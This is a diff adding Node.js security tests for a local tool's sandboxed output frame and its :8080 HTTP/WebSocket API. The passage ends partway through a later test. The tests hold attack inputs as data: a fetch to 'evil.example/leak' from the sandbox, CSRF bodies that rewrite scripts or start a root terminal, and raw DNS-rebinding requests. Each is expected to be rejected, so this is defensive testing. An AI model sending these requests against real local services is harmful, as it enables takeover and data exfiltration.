@@ -1,9 +1,11 @@
 import test from 'node:test'
 import assert from 'node:assert/strict'
 import { spawn } from 'node:child_process'
+import crypto from 'node:crypto'
 import fsSync from 'node:fs'
 import fs from 'node:fs/promises'
 import http from 'node:http'
+import net from 'node:net'
 import os from 'node:os'
 import path from 'node:path'
 import vm from 'node:vm'
@@ -25,8 +27,10 @@ import {
  attenuateKv,
  bindSecretStoreToKv,
  buildNodePermissionExecArgs,
+ buildSandboxedOutputCsp,
  buildSandboxedOutputSrcdoc,
  closePackageInSession,
+ createAgentEventHub,
  createCapabilityToken,
  createDataProxyHandler,
  createFileBackedServerSecretStore,
@@ -56,9 +60,16 @@ import {
  exportModalSource,
  field,
  formatImportLine,
+ handleAgentApiRequest,
+ handleDeployApiRequest,
+ handleDeployUpgrade,
+ handleFsApiRequest,
  hasImportCycle,
+ hasJsonContentType,
  httpKV,
  initSessionState,
+ isAllowedLocalHost,
+ isAllowedLocalOrigin,
  isBlockedIpAddress,
  isForbiddenDirectKvKey,
  isMaskedSecretValue,
@@ -90,12 +101,14 @@ import {
  saveLaneScript,
  sessionModalSource,
  setLaneSecret,
+ setSessionDataDir,
  simulateLaneRequestInWorker,
  validateOutputFrameMessage,
  validateOutputRpcRequest,
  validateSourceFetchUrl,
  validateSourceWorkerRpcRequest,
  vaultMasterKey,
+ verifyApiSessionToken,
  verifyCapabilityToken,
 } from './field.fixtures.mjs'
 
@@ -2217,5 +2230,737 @@ test('server-only secret store removes vault#master-key & passphrase hashes from
    await new Promise(resolve => proxyServer.close(resolve))
   }
   await fs.rm(tmpDir, { recursive: true, force: true })
+ }
+})
+
+test('buildSandboxedOutputSrcdoc enforces strict CSP (script sha256 hash, connect-src none, no inline/eval scripts) and blocks outbound network calls', async () => {
+ const rawModuleWithCrlf = "const greeting = 'hello'\r\nconst two = 2"
+ const srcdoc = buildSandboxedOutputSrcdoc({
+  frameId: 'csp-frame-1',
+  fieldModuleSource: rawModuleWithCrlf,
+ })
+
+ const charsetIdx = srcdoc.indexOf('<meta charset="utf-8">')
+ const cspMatch = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(srcdoc)
+ const styleIdx = srcdoc.indexOf('<style>')
+ const scriptMatch = /<script type="module">([\s\S]*?)<\/script>/.exec(srcdoc)
+
+ assert.ok(charsetIdx !== -1, 'srcdoc must contain charset meta tag')
+ assert.ok(cspMatch, 'srcdoc must include <meta http-equiv="Content-Security-Policy">')
+ assert.ok(cspMatch.index > charsetIdx && cspMatch.index < styleIdx, 'CSP meta tag must appear inside <head> right after charset')
+ assert.ok(scriptMatch, 'srcdoc must include inline <script type="module">')
+
+ const csp = cspMatch[1]
+ const directives = new Map(
+  csp.split(';').map(part => {
+   const trimmed = part.trim()
+   const spaceIdx = trimmed.indexOf(' ')
+   return spaceIdx === -1 ? [trimmed, ''] : [trimmed.slice(0, spaceIdx), trimmed.slice(spaceIdx + 1)]
+  })
+ )
+
+ assert.equal(directives.get('default-src'), "'none'")
+ assert.equal(directives.get('connect-src'), "'none'")
+ assert.equal(directives.get('frame-src'), "'none'")
+ assert.equal(directives.get('child-src'), "'none'")
+ assert.equal(directives.get('worker-src'), "'none'")
+ assert.equal(directives.get('object-src'), "'none'")
+ assert.equal(directives.get('base-uri'), "'none'")
+ assert.equal(directives.get('form-action'), "'none'")
+ assert.equal(directives.get('img-src'), 'data: blob:')
+ assert.equal(directives.get('font-src'), 'data:')
+ assert.equal(directives.get('media-src'), 'data: blob:')
+ assert.equal(directives.get('style-src'), "'unsafe-inline'")
+
+ const scriptSrc = directives.get('script-src') || ''
+ assert.ok(!scriptSrc.includes("'unsafe-inline'"), 'script-src must NOT allow unsafe-inline')
+ assert.ok(!scriptSrc.includes("'unsafe-eval'"), 'script-src must NOT allow unsafe-eval')
+
+ const scriptBody = scriptMatch[1]
+ assert.ok(!scriptBody.includes('\r'), 'srcdoc inline script must normalize CRLF to LF before hashing')
+ const expectedHash = crypto.createHash('sha256').update(scriptBody, 'utf8').digest('base64')
+ assert.equal(scriptSrc, `'sha256-${expectedHash}'`)
+ assert.equal(csp, buildSandboxedOutputCsp(scriptBody))
+
+ // Verify mock iframe sandbox blocks external fetch, local :8080 fetch, and navigator.sendBeacon
+ const hostListeners = {}
+ const hostWindow = {
+  addEventListener(type, fn) {
+   hostListeners[type] ||= []
+   hostListeners[type].push(fn)
+  },
+  removeEventListener(type, fn) {
+   hostListeners[type] = (hostListeners[type] || []).filter(h => h !== fn)
+  },
+ }
+ const hostDocument = {
+  createElement(tag) {
+   return { tag, style: {}, attributes: {}, children: [], setAttribute(k, v) { this.attributes[k] = v }, remove() {} }
+  },
+ }
+ const viewportEl = {
+  children: [],
+  appendChild(c) { this.children.push(c) },
+  replaceChildren() { this.children = [] },
+ }
+ const host = createSandboxedOutputHost({ document: hostDocument, window: hostWindow, viewportEl })
+ try {
+  const t = createTransport()
+  const f = field({}, { transport: t })
+  await f.run(parse([
+   `; send (
+    ; to report ; object
+    ; set [ ; try ( !window.fetch 'https://evil.example/leak' ) : 'blocked-external-fetch' ] report.extFetch
+    ; set [ ; try ( !window.fetch 'http://localhost:8080/api/agent/sessions' ) : 'blocked-local-fetch' ] report.localFetch
+    ; set [ ; try ( !window.navigator.sendBeacon 'http://localhost:8080/api/agent/lane/script' '{}' ) : 'blocked-send-beacon' ] report.beacon
+    ; to out !document.createElement pre
+    ; set [ !JSON.stringify $report ] out.textContent
+    $out
+   )`,
+  ].join('\n')))
+  const outcome = await host.render(t.packets())
+  assert.equal(outcome.results[0].error, null)
+  const report = JSON.parse(host.debugOutputEl.children[0].textContent)
+  assert.equal(report.extFetch, 'blocked-external-fetch')
+  assert.equal(report.localFetch, 'blocked-local-fetch')
+  assert.equal(report.beacon, 'blocked-send-beacon')
+ }
+ finally {
+  host.dispose()
+ }
+})
+
+test('Hardened :8080 HTTP/WS boundary: Origin: null, Sec-Fetch-Site, Content-Type 415, POST-only eval, capability-scoped agent/MCP/FS/deploy, and DNS rebinding', async () => {
+ // 1. Unit checks for http-security.mjs Host, Origin, Sec-Fetch-Site, and Content-Type guards
+ assert.equal(isAllowedLocalHost({ headers: { host: 'localhost:8080' } }, { requireHost: true }), true)
+ assert.equal(isAllowedLocalHost({ headers: { host: '127.0.0.1:8080' } }, { requireHost: true }), true)
+ assert.equal(isAllowedLocalHost({ headers: { host: '[::1]:8080' } }, { requireHost: true }), true)
+ assert.equal(isAllowedLocalHost({ headers: {} }, { requireHost: true }), false)
+ assert.equal(isAllowedLocalHost({ headers: { host: 'rebind.evil.com:8080' } }, { requireHost: true }), false)
+ assert.equal(isAllowedLocalHost({ headers: { host: 'localhost.evil.com:8080' } }, { requireHost: true }), false)
+ assert.equal(isAllowedLocalHost({ headers: { host: 'localhost@evil.com:8080' } }, { requireHost: true }), false)
+ assert.equal(isAllowedLocalHost({ headers: { host: '127.0.0.1:99999' } }, { requireHost: true }), false)
+ assert.equal(isAllowedLocalHost({ headers: { host: ['localhost:8080', 'evil.com'] } }, { requireHost: true }), false)
+ assert.equal(
+  isAllowedLocalHost({ headers: { host: 'civil.example.com:8080' } }, { requireHost: true, allowedHosts: ['civil.example.com', '*'], useEnv: false }),
+  true
+ )
+
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'null' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'NULL' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'https://evil.example' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'http://localhost:3000' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'rebind.evil.com:8080', origin: 'http://rebind.evil.com:8080' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', 'sec-fetch-site': 'cross-site' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', 'sec-fetch-site': 'same-site' } }), false)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', origin: 'http://localhost:8080', 'sec-fetch-site': 'same-origin' } }), true)
+ assert.equal(isAllowedLocalOrigin({ headers: { host: 'localhost:8080', 'sec-fetch-site': 'none' } }), true)
+ assert.equal(
+  isAllowedLocalOrigin(
+   { headers: { host: 'civil.example.com:8080', origin: 'https://civil.example.com:8080' } },
+   { allowedHosts: ['civil.example.com'], useEnv: false }
+  ),
+  true
+ )
+ assert.equal(
+  isAllowedLocalOrigin(
+   { headers: { host: 'civil.example.com:8080', origin: 'null' } },
+   { allowedHosts: ['civil.example.com'], useEnv: false }
+  ),
+  false
+ )
+ const prevAllowedHostsEnv = process.env.CC_ALLOWED_HOSTS
+ try {
+  process.env.CC_ALLOWED_HOSTS = 'civil.example.com, *'
+  assert.equal(
+   isAllowedLocalHost({ headers: { host: 'civil.example.com:8080' } }, { requireHost: true }),
+   true
+  )
+  assert.equal(
+   isAllowedLocalOrigin({ headers: { host: 'civil.example.com:8080', origin: 'https://civil.example.com:8080' } }),
+   true
+  )
+  assert.equal(
+   isAllowedLocalOrigin({ headers: { host: 'civil.example.com:8080', origin: 'null' } }),
+   false
+  )
+  assert.equal(
+   isAllowedLocalHost({ headers: { host: 'other.attacker.example:8080' } }, { requireHost: true }),
+   false
+  )
+ }
+ finally {
+  if (prevAllowedHostsEnv === undefined) delete process.env.CC_ALLOWED_HOSTS
+  else process.env.CC_ALLOWED_HOSTS = prevAllowedHostsEnv
+ }
+
+ assert.equal(hasJsonContentType({ headers: { 'content-type': 'application/json' } }), true)
+ assert.equal(hasJsonContentType({ headers: { 'content-type': 'application/json; charset=utf-8' } }), true)
+ assert.equal(hasJsonContentType({ headers: { 'content-type': 'text/plain' } }), false)
+ assert.equal(hasJsonContentType({ headers: { 'content-type': 'application/x-www-form-urlencoded' } }), false)
+ assert.equal(hasJsonContentType({ headers: {} }), false)
+
+ // 2. Boot loopback server matching `start`'s exact routing and security boundary
+ const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'cc-csrf-hardening-'))
+ const vaultFile = path.join(tmpDir, 'secrets', 'vault-secrets.json')
+ const fsHome = path.join(tmpDir, 'fs-home')
+ await fs.mkdir(fsHome, { recursive: true })
+ const backendKv = createSwitchableMemoryBackendKv()
+ const secretStore = createFileBackedServerSecretStore({ filePath: vaultFile, useEnv: false })
+ const proxy = createDataProxyHandler({ backendKv, secretStore, setAsDefaultStore: false })
+ const eventHub = createAgentEventHub()
+ const emittedEvents = []
+ eventHub.subscribe(ev => emittedEvents.push(ev))
+ const dummyTerminalManager = {
+  createSession() {
+   return { id: 'dummy-term-1', title: 'Dummy SSH' }
+  },
+  killSession() {
+   return false
+  },
+  attachWebSocket(_id, _req, socket) {
+   socket.write('HTTP/1.1 101 Switching Protocols\r\n\r\n')
+   socket.destroy()
+   return true
+  },
+ }
+
+ const server = http.createServer((req, res) => {
+  if (!isAllowedLocalHost(req, { requireHost: true })) {
+   const reqPath = (req.url || '/').split('?')[0]
+   if (reqPath === '/api' || reqPath.startsWith('/api/')) {
+    res.writeHead(403, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' })
+    res.end(JSON.stringify({ ok: false, error: 'Forbidden Host header' }))
+   }
+   else {
+    res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' })
+    res.end('Forbidden')
+   }
+   return
+  }
+  const pathname = (req.url || '/').split('?')[0]
+  if (pathname === '/api/fs' || pathname.startsWith('/api/fs/')) {
+   return handleFsApiRequest(req, res, {
+    secretStore,
+    platform: 'linux',
+    homedir: fsHome,
+    mountsText: '',
+    extraMountParents: [],
+   })
+  }
+  if (pathname === '/api/deploy' || pathname.startsWith('/api/deploy/')) {
+   return handleDeployApiRequest(req, res, { secretStore, terminalManager: dummyTerminalManager })
+  }
+  if (pathname === '/api/mcp' || pathname === '/api/agent' || pathname.startsWith('/api/agent/')) {
+   return handleAgentApiRequest(req, res, {
+    secretStore,
+    createAuthorizedRootKv: proxy.createAuthorizedRootKv,
+    eventHub,
+   })
+  }
+  if (pathname === '/api/vault' || pathname.startsWith('/api/vault/')) {
+   return proxy.handleVaultApiRequest(req, res)
+  }
+  if (pathname === '/api/data' || pathname.startsWith('/api/data/')) {
+   return proxy.handleDataProxyRequest(req, res)
+  }
+  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
+  res.end('<!doctype html><title>OK</title>')
+ })
+
+ server.on('upgrade', (req, socket, head) => {
+  const pathname = (req.url || '/').split('?')[0]
+  if (pathname === '/api/deploy/terminal/ws') {
+   if (!isAllowedLocalHost(req, { requireHost: true }) || !isAllowedLocalOrigin(req, { requireHost: true })) {
+    socket.write('HTTP/1.1 403 Forbidden\r\nConnection: close\r\n\r\n')
+    socket.destroy()
+    return
+   }
+   handleDeployUpgrade(req, socket, head, { terminalManager: dummyTerminalManager, requireHost: true })
+   return
+  }
+  socket.destroy()
+ })
+
+ await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
+ const port = server.address().port
+ const origin = `http://127.0.0.1:${port}`
+ const dataUrl = `${origin}/api/data?mode=disk`
+
+ function sendRawHttpRequest(rawText) {
+  return new Promise((resolve, reject) => {
+   const client = net.connect(port, '127.0.0.1')
+   const chunks = []
+   client.on('connect', () => {
+    client.write(rawText)
+   })
+   client.on('data', chunk => {
+    chunks.push(chunk)
+    const str = Buffer.concat(chunks).toString('utf8')
+    if (str.includes('\r\n\r\n')) {
+     const headerEnd = str.indexOf('\r\n\r\n')
+     const headStr = str.slice(0, headerEnd)
+     const statusLine = headStr.split('\r\n')[0] || ''
+     const statusMatch = /^HTTP\/1\.[01]\s+(\d{3})/.exec(statusLine)
+     const bodyPart = str.slice(headerEnd + 4)
+     client.end()
+     resolve({
+      status: statusMatch ? Number(statusMatch[1]) : 0,
+      raw: str,
+      head: headStr,
+      body: bodyPart,
+     })
+    }
+   })
+   client.on('end', () => {
+    const str = Buffer.concat(chunks).toString('utf8')
+    const statusMatch = /^HTTP\/1\.[01]\s+(\d{3})/.exec(str.split('\r\n')[0] || '')
+    resolve({
+     status: statusMatch ? Number(statusMatch[1]) : 0,
+     raw: str,
+     head: str.split('\r\n\r\n')[0] || '',
+     body: str.split('\r\n\r\n').slice(1).join('\r\n\r\n'),
+    })
+   })
+   client.on('error', reject)
+  })
+ }
+
+ try {
+  // 3. Seed Session A with a Default public lane AND a passphrase-protected VaultPkg lane
+  const clientA = httpKV({ baseUrl: dataUrl, switchable: true, proxyCapabilities: true })
+  const winA = {}
+  const sessA = await initSessionState(clientA, winA)
+  const createdPkg = await createPackage(clientA, sessA.sessionId, {
+   name: 'VaultPkg',
+   passphrase: 'csrf-vault-passphrase',
+  }, winA)
+  assert.equal(createdPkg.ok, true)
+  const vaultPkgId = createdPkg.pkg.id
+  const tokenAUnlocked = clientA.getSessionToken()
+
+  const publicLaneId = 'lane-public-csrf'
+  const lockedLaneId = 'lane-vault-csrf'
+  await registerLaneInPackage(clientA, publicLaneId, 'PublicLane', DEFAULT_PACKAGE_ID)
+  await clientA.namespace(publicLaneId).set('title', 'PublicLane')
+  await saveLaneScript(clientA, clientA.namespace(publicLaneId), publicLaneId, ['; to val 10'])
+
+  await registerLaneInPackage(clientA, lockedLaneId, 'ClassifiedLane', vaultPkgId)
+  await clientA.namespace(lockedLaneId).set('title', 'ClassifiedLane')
+  await saveLaneScript(clientA, clientA.namespace(lockedLaneId), lockedLaneId, ['; to classified 777'])
+
+  // Bootstrap token (sid: null, dir: null, allowUnlocked: true)
+  const bootRes = await fetch(`${origin}/api/vault/session`, {
+   method: 'POST',
+   headers: { 'Content-Type': 'application/json' },
+   body: '{}',
+  }).then(r => r.json())
+  assert.equal(bootRes.ok, true)
+  const bootstrapToken = bootRes.token
+
+  // Lane-scoped capability token (only valid for /api/data on publicLaneId)
+  const laneTokRes = await clientA.fetchVaultApi('lane-token', {
+   method: 'POST',
+   body: { lanes: [publicLaneId] },
+  })
+  const laneOnlyToken = laneTokRes.data.token
+  clientA.setSessionToken(tokenAUnlocked, { sessionId: sessA.sessionId, basePath: null })
+
+  const eventsBeforeAttacks = emittedEvents.length
+
+  // 4. Unauthenticated requests -> 401 + x-civil-token-bootstrap, and lane-scoped tokens -> 403
+  for (const [m, p] of [
+   ['GET', '/api/agent/sessions'],
+   ['GET', '/api/agent/events'],
+   ['POST', '/api/mcp'],
+   ['GET', '/api/fs/roots'],
+   ['POST', '/api/fs/mkdir'],
+   ['POST', '/api/deploy/kv/test'],
+  ]) {
+   const unauth = await fetch(`${origin}${p}`, {
+    method: m,
+    ...(m === 'POST' ? { headers: { 'Content-Type': 'application/json' }, body: '{}' } : {}),
+   })
+   assert.equal(unauth.status, 401, `Expected 401 without token for ${m} ${p}`)
+   assert.equal(unauth.headers.get(TOKEN_BOOTSTRAP_HEADER), '/api/vault/session')
+
+   const laneDenied = await fetch(`${origin}${p}`, {
+    method: m,
+    headers: {
+     [SESSION_TOKEN_HEADER]: laneOnlyToken,
+     ...(m === 'POST' ? { 'Content-Type': 'application/json' } : {}),
+    },
+    ...(m === 'POST' ? { body: '{}' } : {}),
+   })
+   assert.equal(laneDenied.status, 403, `Expected 403 for lane-scoped token on ${m} ${p}`)
+  }
+
+  // Query ?token= must ONLY work on GET /api/agent/events, never on REST endpoints
+  const queryRestDenied = await fetch(`${origin}/api/agent/sessions?token=${encodeURIComponent(bootstrapToken)}`)
+  assert.equal(queryRestDenied.status, 401)
+  const queryFsDenied = await fetch(`${origin}/api/fs/roots?token=${encodeURIComponent(bootstrapToken)}`)
+  assert.equal(queryFsDenied.status, 401)
+  const queryEventsLaneDenied = await fetch(`${origin}/api/agent/events?token=${encodeURIComponent(laneOnlyToken)}`)
+  assert.equal(queryEventsLaneDenied.status, 403)
+
+  // Verify SSE events endpoint accepts valid query ?token= from same-origin
+  const sseAbort = new AbortController()
+  const sseResp = await fetch(`${origin}/api/agent/events?token=${encodeURIComponent(bootstrapToken)}`, {
+   signal: sseAbort.signal,
+  })
+  assert.equal(sseResp.status, 200)
+  assert.ok((sseResp.headers.get('content-type') || '').includes('text/event-stream'))
+  sseAbort.abort()
+
+  // 5. Origin: null, external Origin, cross-port Origin, and Sec-Fetch-Site: cross-site/same-site -> 403 everywhere
+  const badOriginHeaderSets = [
+   { Origin: 'null' },
+   { Origin: 'https://evil.example' },
+   { Origin: 'http://127.0.0.1:9999' },
+   { 'Sec-Fetch-Site': 'cross-site' },
+   { 'Sec-Fetch-Site': 'same-site' },
+  ]
+  const csrfTargets = [
+   ['POST', '/api/agent/lane/script', JSON.stringify({ laneId: publicLaneId, action: 'set-line', lineNumber: 1, text: '; to pwn 1' })],
+   ['POST', '/api/mcp', JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'cc_create_lane', arguments: { title: 'Pwned' } } })],
+   ['POST', '/api/agent/lane/eval', JSON.stringify({ laneId: publicLaneId })],
+   ['GET', '/api/agent/sessions', null],
+   ['GET', `/api/agent/events?token=${encodeURIComponent(bootstrapToken)}`, null],
+   ['POST', '/api/fs/mkdir', JSON.stringify({ parent: fsHome, name: 'csrf-origin-dir' })],
+   ['GET', '/api/fs/roots', null],
+   ['POST', '/api/deploy/terminal/start', JSON.stringify({ action: 'shell', server: { host: '127.0.0.1', user: 'root' } })],
+   ['POST', '/api/vault/session', '{}'],
+   ['GET', `/api/data?mode=disk&key=${encodeURIComponent(`${publicLaneId}.title`)}`, null],
+  ]
+  for (const extraHeaders of badOriginHeaderSets) {
+   for (const [m, p, body] of csrfTargets) {
+    const res = await fetch(`${origin}${p}`, {
+     method: m,
+     headers: {
+      [SESSION_TOKEN_HEADER]: tokenAUnlocked,
+      ...(m === 'POST' ? { 'Content-Type': 'application/json' } : {}),
+      ...extraHeaders,
+     },
+     ...(body !== null ? { body } : {}),
+    })
+    assert.equal(res.status, 403, `Expected 403 for ${JSON.stringify(extraHeaders)} on ${m} ${p}`)
+   }
+  }
+
+  // WS upgrade with Origin: null / evil Origin / Sec-Fetch-Site: cross-site -> 403
+  for (const hdrLine of ['Origin: null', 'Origin: https://evil.example', 'Sec-Fetch-Site: cross-site']) {
+   const wsErr = await sendRawHttpRequest(
+    `GET /api/deploy/terminal/ws?id=dummy-term-1 HTTP/1.1\r\n` +
+    `Host: 127.0.0.1:${port}\r\n` +
+    `${hdrLine}\r\n` +
+    'Upgrade: websocket\r\n' +
+    'Connection: Upgrade\r\n' +
+    `Sec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\n` +
+    'Sec-WebSocket-Version: 13\r\n\r\n'
+   )
+   assert.equal(wsErr.status, 403, `Expected WS upgrade 403 for ${hdrLine}`)
+  }
+
+  // 6. Non-JSON Content-Type (text/plain, form-urlencoded, missing) -> 415 before body parsing
+  const badContentTypes = ['text/plain', 'application/x-www-form-urlencoded', null]
+  const jsonMutatingTargets = [
+   ['/api/agent/lane/script', JSON.stringify({ laneId: publicLaneId, action: 'set-line', lineNumber: 1, text: '; to pwn 2' })],
+   ['/api/mcp', JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'cc_create_lane', arguments: { title: 'CT-Pwn' } } })],
+   ['/api/agent/lane/eval', JSON.stringify({ laneId: publicLaneId, applyExports: true })],
+   ['/api/fs/mkdir', JSON.stringify({ parent: fsHome, name: 'csrf-pwned-dir' })],
+   ['/api/deploy/terminal/start', JSON.stringify({ action: 'shell', server: { host: '127.0.0.1', user: 'root' } })],
+   ['/api/vault/session', '{}'],
+  ]
+  for (const ct of badContentTypes) {
+   for (const [p, body] of jsonMutatingTargets) {
+    const headers = { [SESSION_TOKEN_HEADER]: tokenAUnlocked }
+    if (ct !== null) {
+     headers['Content-Type'] = ct
+    }
+    const res = await fetch(`${origin}${p}`, { method: 'POST', headers, body })
+    assert.equal(res.status, 415, `Expected 415 for Content-Type=${String(ct)} on POST ${p}`)
+   }
+  }
+
+  // 7. GET /api/agent/lane/eval is rejected with 405
+  const getEvalRes = await fetch(`${origin}/api/agent/lane/eval?lane=${encodeURIComponent(publicLaneId)}&applyExports=true`, {
+   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
+  })
+  assert.equal(getEvalRes.status, 405)
+
+  // Verify none of the CSRF/415/405 attacks modified scripts, created directories, or emitted SSE events
+  const loadedPublicAfter = await loadLaneScript(clientA, clientA.namespace(publicLaneId), publicLaneId)
+  assert.deepEqual(loadedPublicAfter.records.map(r => r.text), ['; to val 10'])
+  await assert.rejects(() => fs.stat(path.join(fsHome, 'csrf-pwned-dir')))
+  await assert.rejects(() => fs.stat(path.join(fsHome, 'csrf-origin-dir')))
+  assert.equal(emittedEvents.length, eventsBeforeAttacks)
+
+  // 8. createAuthorizedRootKv on /api/agent/* and /api/mcp enforces package locks and revocations
+  const bootPublicLane = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${publicLaneId}`, {
+   headers: { [SESSION_TOKEN_HEADER]: bootstrapToken },
+  })
+  assert.equal(bootPublicLane.status, 200)
+  const bootPublicJson = await bootPublicLane.json()
+  assert.equal(bootPublicJson.ok, true)
+
+  const bootSessInspect = await fetch(`${origin}/api/agent/session?session=${encodeURIComponent(sessA.sessionId)}`, {
+   headers: { [SESSION_TOKEN_HEADER]: bootstrapToken },
+  })
+  assert.equal(bootSessInspect.status, 200)
+  const bootSessJson = await bootSessInspect.json()
+  assert.equal(bootSessJson.ok, true)
+  assert.ok(!bootSessJson.openPackageIds.includes(vaultPkgId), 'Locked VaultPkg must be omitted from unlocked session inspect')
+  assert.ok(!bootSessJson.catalog.some(entry => entry.id === lockedLaneId), 'Locked lane must be omitted from catalog')
+
+  const lockedGetRes = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${lockedLaneId}`, {
+   headers: { [SESSION_TOKEN_HEADER]: bootstrapToken },
+  })
+  assert.equal(lockedGetRes.status, 403)
+
+  const lockedEvalRes = await fetch(`${origin}/api/agent/lane/eval`, {
+   method: 'POST',
+   headers: { 'Content-Type': 'application/json', [SESSION_TOKEN_HEADER]: bootstrapToken },
+   body: JSON.stringify({ sessionId: sessA.sessionId, laneId: lockedLaneId }),
+  })
+  assert.equal(lockedEvalRes.status, 403)
+
+  const lockedScriptRes = await fetch(`${origin}/api/agent/lane/script`, {
+   method: 'POST',
+   headers: { 'Content-Type': 'application/json', [SESSION_TOKEN_HEADER]: bootstrapToken },
+   body: JSON.stringify({ sessionId: sessA.sessionId, laneId: lockedLaneId, action: 'set-line', lineNumber: 1, text: '; to x 1' }),
+  })
+  assert.equal(lockedScriptRes.status, 403)
+
+  const lockedMcpRes = await fetch(`${origin}/api/mcp`, {
+   method: 'POST',
+   headers: { 'Content-Type': 'application/json', [SESSION_TOKEN_HEADER]: bootstrapToken },
+   body: JSON.stringify({
+    jsonrpc: '2.0',
+    id: 10,
+    method: 'tools/call',
+    params: { name: 'cc_get_lane', arguments: { sessionId: sessA.sessionId, laneId: lockedLaneId } },
+   }),
+  }).then(r => r.json())
+  assert.equal(lockedMcpRes.result.isError, true)
+  assert.equal(lockedMcpRes.result.structuredContent.accessDenied, true)
+
+  // Unlocked Session A token CAN access lockedLaneId, and loses access immediately after closePackageInSession
+  const unlockedGetRes = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${lockedLaneId}`, {
+   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
+  })
+  assert.equal(unlockedGetRes.status, 200)
+  const unlockedGetJson = await unlockedGetRes.json()
+  assert.deepEqual(unlockedGetJson.lane.lines, ['; to classified 777'])
+
+  await closePackageInSession(clientA, sessA.sessionId, vaultPkgId)
+  const postCloseAgentRes = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${lockedLaneId}`, {
+   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
+  })
+  assert.equal(postCloseAgentRes.status, 403)
+
+  // 9. DNS Rebinding protection: Host + matching Origin for non-local hostname -> 403 on all endpoints
+  const rebindHost = `rebind.attacker.example:${port}`
+  const rebindOrigin = `http://rebind.attacker.example:${port}`
+  const rebindTargets = [
+   `GET / HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\nConnection: close\r\n\r\n`,
+   `POST /api/deploy/terminal/start HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
+   `GET /api/deploy/terminal/ws?id=dummy-term-1 HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`,
+   `GET /api/agent/sessions HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nConnection: close\r\n\r\n`,
+   `POST /api/mcp HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
+   `GET /api/fs/roots HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nConnection: close\r\n\r\n`,
+   `POST /api/vault/session HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
+   `GET /api/data?mode=disk&key=${encodeURIComponent(`${publicLaneId}.title`)} HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nConnection: close\r\n\r\n`,
+  ]
+  for (const rawReq of rebindTargets) {
+   const rebindRes = await sendRawHttpRequest(rawReq)
+   assert.equal(rebindRes.status, 403, `Expected 403 for DNS rebinding request: ${rawReq.split('\r\n')[0]}`)
+  }
+
+  // Verify verifyApiSessionToken utility directly
+  assert.equal(verifyApiSessionToken({ headers: {}, url: '/api/agent/sessions' }, { secretStore }).status, 401)
+  assert.equal(
+   verifyApiSessionToken({ headers: { [SESSION_TOKEN_HEADER.toLowerCase()]: laneOnlyToken }, url: '/api/agent/sessions' }, { secretStore }).status,
+   403
+  )
+  assert.equal(
+   verifyApiSessionToken({ headers: { [SESSION_TOKEN_HEADER.toLowerCase()]: bootstrapToken }, url: '/api/agent/sessions' }, { secretStore }).ok,
+   true
+  )
+ }
+ finally {
+  if (typeof server.closeAllConnections === 'function') {
+   server.closeAllConnections()
+  }
+  await new Promise(resolve => server.close(resolve))
+  await fs.rm(tmpDir, { recursive: true, force: true })
+ }
+})
+
+test('data-proxy sends text/plain Content-Type to civil-memory, httpKV proactively bootstraps tokens (zero 401s), and /api/vault/fetch proxies CORS-free external fetches safely', async () => {
+ const memStore = new Map()
+ const memServer = http.createServer((req, res) => {
+  const url = new URL(req.url || '/', 'http://127.0.0.1')
+  const basePath = url.searchParams.get('modeOptions.disk.basePath') || '__default__'
+  const key = url.searchParams.get('key')
+  const fullKey = `${basePath}::${key}`
+  const method = String(req.method || 'GET').toUpperCase()
+  const chunks = []
+  req.on('data', chunk => chunks.push(chunk))
+  req.on('end', () => {
+   if (method === 'GET' || method === 'HEAD') {
+    if (!memStore.has(fullKey)) {
